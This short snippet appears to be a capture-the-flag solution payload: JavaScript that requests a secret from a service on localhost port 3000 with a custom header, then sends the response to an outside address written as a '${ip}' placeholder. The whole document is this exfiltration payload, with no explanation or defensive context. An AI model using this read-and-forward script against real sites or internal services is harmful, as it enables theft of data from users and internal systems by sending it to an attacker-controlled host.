// url
// http://${ip}

// javascript
fetch("http://127.0.0.1:3000/flag", {
    headers: { 'give-me-the-flag': 'yes' }
}).then(res => {
    return res.text();
}).then(res => {
    fetch(`http://${ip}/flag?flag=${res}`)
});
